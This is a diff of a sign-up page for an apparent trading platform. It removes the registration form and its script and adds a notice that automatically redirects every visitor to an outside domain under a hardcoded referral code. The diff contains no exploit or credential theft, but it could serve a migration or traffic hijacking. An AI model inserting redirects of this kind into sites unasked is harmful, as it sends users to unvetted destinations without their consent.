@@ -3,9 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>QVSE | Create Account</title>
+    <title>QVSE is moving to RXDT!</title>
     <link rel="icon" type="image/svg+xml" href="favicon.svg">
     <link rel="stylesheet" href="style.css">
+    <style>
+        .billboard-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            padding: 20px;
+            background-color: var(--bg-color, #111);
+            color: var(--text-color, #fff);
+        }
+        .billboard-title {
+            font-size: 2rem;
+            margin-bottom: 15px;
+            color: #4facfe;
+        }
+        .billboard-message {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #bbb;
+        }
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #4facfe;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
     <div class="phone-container">
@@ -16,272 +51,18 @@
             </svg>
         </a>
 
-        <!-- Create Title -->
-        <h1 class="login-title">Create</h1>
-
-        <!-- Tabs -->
-        <div class="tabs">
-            <div class="tab active" id="tabEmail" data-tab="email">
-                Email
-                <div class="tab-indicator"></div>
-            </div>
-            <div class="tab" id="tabPhone" data-tab="phone">
-                Phone Number
-                <div class="tab-indicator"></div>
-            </div>
+        <div class="billboard-container">
+            <h1 class="billboard-title">QVSE is moving to RXDT!</h1>
+            <p class="billboard-message">Please wait, you are being redirected to our new registration page...</p>
+            <div class="loader"></div>
         </div>
-
-        <!-- Sign Up Form -->
-        <form id="signupForm" autocomplete="off" novalidate>
-            <!-- Email Input -->
-            <div class="input-group" id="emailGroup">
-                <label class="input-label">Email</label>
-                <div class="input-wrapper">
-                    <input type="email" id="signupEmailInput" placeholder="Please Enter Email" autocomplete="off">
-                </div>
-            </div>
-
-            <!-- Phone Number Input (hidden by default) -->
-            <div class="input-group hidden" id="phoneGroup">
-                <label class="input-label">Phone Number</label>
-                <div class="input-wrapper">
-                    <input type="tel" id="signupPhoneInput" placeholder="Please Enter Phone Number" autocomplete="off">
-                </div>
-            </div>
-
-            <!-- Verification Code -->
-            <div class="input-group">
-                <label class="input-label">Verification Code</label>
-                <div class="input-wrapper verify-wrapper">
-                    <input type="text" id="signupVerificationCode" placeholder="Please enter verification code" autocomplete="off">
-                    <button type="button" class="get-code-btn" id="getCodeBtn">Get Code</button>
-                </div>
-            </div>
-
-            <!-- Password -->
-            <div class="input-group">
-                <label class="input-label">Password</label>
-                <div class="input-wrapper password-wrapper">
-                    <input type="password" id="signupPasswordInput" placeholder="Please Enter Password" autocomplete="off">
-                    <button type="button" class="toggle-password" onclick="togglePw(this)">
-                        <svg class="eye-icon eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-                            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-                            <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
-                            <line x1="1" y1="1" x2="23" y2="23"/>
-                        </svg>
-                        <svg class="eye-icon eye-open hidden" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                            <circle cx="12" cy="12" r="3"/>
-                        </svg>
-                    </button>
-                </div>
-            </div>
-
-            <!-- Confirm Password -->
-            <div class="input-group">
-                <label class="input-label">Confirm Password</label>
-                <div class="input-wrapper password-wrapper">
-                    <input type="password" id="signupConfirmPasswordInput" placeholder="Confirm Password" autocomplete="off">
-                    <button type="button" class="toggle-password" onclick="togglePw(this)">
-                        <svg class="eye-icon eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-                            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-                            <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
-                            <line x1="1" y1="1" x2="23" y2="23"/>
-                        </svg>
-                        <svg class="eye-icon eye-open hidden" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                            <circle cx="12" cy="12" r="3"/>
-                        </svg>
-                    </button>
-                </div>
-            </div>
-
-            <!-- Trading Password -->
-            <div class="input-group">
-                <label class="input-label">Trading Password</label>
-                <div class="input-wrapper password-wrapper">
-                    <input type="password" id="signupTradingPasswordInput" placeholder="Please Enter 6-Digit Password" autocomplete="off" maxlength="6">
-                    <button type="button" class="toggle-password" onclick="togglePw(this)">
-                        <svg class="eye-icon eye-closed" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
-                            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
-                            <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/>
-                            <line x1="1" y1="1" x2="23" y2="23"/>
-                        </svg>
-                        <svg class="eye-icon eye-open hidden" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#bbb" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
-                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                            <circle cx="12" cy="12" r="3"/>
-                        </svg>
-                    </button>
-                </div>
-            </div>
-
-            <!-- Invite Code -->
-            <div class="input-group">
-                <label class="input-label">Invite Code</label>
-                <div class="input-wrapper">
-                    <input type="text" id="signupInviteCode" placeholder="Please Enter Invite Code" autocomplete="off">
-                </div>
-            </div>
-
-            <!-- User Agreement -->
-            <div class="checkbox-row agreement-row">
-                <label class="custom-checkbox">
-                    <input type="checkbox" id="signupAgreement" checked>
-                    <span class="checkmark">
-                        <svg width="18" height="18" viewBox="0 0 20 20">
-                            <circle cx="10" cy="10" r="10" fill="#333"/>
-                            <polyline points="6 10 9 13 14 7" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        </svg>
-                    </span>
-                    <span class="checkbox-label">I have read and agree <a href="#" class="agreement-link">User Agreement</a></span>
-                </label>
-            </div>
-
-            <!-- Next Step Button -->
-            <button type="submit" class="login-btn" id="signupBtn">Next Step</button>
-        </form>
-
-        <!-- Bottom Bar (iPhone style) -->
-        <div class="bottom-bar">
-            <div class="bottom-bar-line"></div>
-        </div>
-    </div>
-
-    <!-- Toast Notification -->
-    <div class="toast" id="toast">
-        <span class="toast-icon">✓</span>
-        <span class="toast-message" id="toastMessage">Account created successfully</span>
     </div>
 
     <script>
-        // Tab switching
-        const tabEmail = document.getElementById('tabEmail');
-        const tabPhone = document.getElementById('tabPhone');
-        const emailGroup = document.getElementById('emailGroup');
-        const phoneGroup = document.getElementById('phoneGroup');
-        let activeTab = 'email';
-
-        tabEmail.addEventListener('click', function () {
-            activeTab = 'email';
-            tabEmail.classList.add('active');
-            tabPhone.classList.remove('active');
-            emailGroup.classList.remove('hidden');
-            phoneGroup.classList.add('hidden');
-        });
-
-        tabPhone.addEventListener('click', function () {
-            activeTab = 'phone';
-            tabPhone.classList.add('active');
-            tabEmail.classList.remove('active');
-            phoneGroup.classList.remove('hidden');
-            emailGroup.classList.add('hidden');
-        });
-
-        // Password toggle (reusable)
-        function togglePw(btn) {
-            const input = btn.parentElement.querySelector('input');
-            const closed = btn.querySelector('.eye-closed');
-            const open = btn.querySelector('.eye-open');
-            if (input.type === 'password') {
-                input.type = 'text';
-                closed.classList.add('hidden');
-                open.classList.remove('hidden');
-            } else {
-                input.type = 'password';
-                open.classList.add('hidden');
-                closed.classList.remove('hidden');
-            }
-        }
-
-        // Toast
-        const toast = document.getElementById('toast');
-        const toastMessage = document.getElementById('toastMessage');
-
-        function showToast(message, isError) {
-            toastMessage.textContent = message;
-            toast.classList.remove('error');
-            if (isError) toast.classList.add('error');
-            toast.classList.add('show');
-            setTimeout(function () { toast.classList.remove('show'); }, 3000);
-        }
-
-        // Form submission
-        const signupForm = document.getElementById('signupForm');
-        signupForm.addEventListener('submit', async function (e) {
-            e.preventDefault();
-
-            const email = document.getElementById('signupEmailInput').value.trim();
-            const phone = document.getElementById('signupPhoneInput').value.trim();
-            const password = document.getElementById('signupPasswordInput').value.trim();
-            const confirmPassword = document.getElementById('signupConfirmPasswordInput').value.trim();
-            const tradingPassword = document.getElementById('signupTradingPasswordInput').value.trim();
-            const inviteCode = document.getElementById('signupInviteCode').value.trim();
-            const agreed = document.getElementById('signupAgreement').checked;
-
-            // Validation
-            if (activeTab === 'email' && !email) {
-                showToast('Please enter your email', true);
-                return;
-            }
-            if (activeTab === 'phone' && !phone) {
-                showToast('Please enter your phone number', true);
-                return;
-            }
-            if (!password) {
-                showToast('Please enter a password', true);
-                return;
-            }
-            if (password !== confirmPassword) {
-                showToast('Passwords do not match', true);
-                return;
-            }
-            if (!agreed) {
-                showToast('Please agree to the User Agreement', true);
-                return;
-            }
-
-            const payload = {
-                signup_type: activeTab,
-                email: activeTab === 'email' ? email : '',
-                phone_number: activeTab === 'phone' ? phone : '',
-                password: password,
-                trading_password: tradingPassword,
-                invite_code: inviteCode
-            };
-
-            const signupBtn = document.getElementById('signupBtn');
-            signupBtn.disabled = true;
-            signupBtn.textContent = 'Creating Account...';
-
-            try {
-                const response = await fetch('/api/signup', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                const data = await response.json();
-
-                if (data.success) {
-                    showToast('Account created successfully!', false);
-                    setTimeout(function () {
-                        window.location.href = 'index.html';
-                    }, 1500);
-                } else {
-                    signupBtn.disabled = false;
-                    signupBtn.textContent = 'Next Step';
-                    showToast(data.message || 'Something went wrong', true);
-                }
-            } catch (err) {
-                signupBtn.disabled = false;
-                signupBtn.textContent = 'Next Step';
-                showToast('Failed to connect to server', true);
-                console.error('Error:', err);
-            }
-        });
+        // Redirect to new RXDT registration page after 4 seconds
+        setTimeout(function() {
+            window.location.href = 'https://www.rxdt.site/#/register?invite=RX8T17';
+        }, 4000);
     </script>
 </body>
 </html>
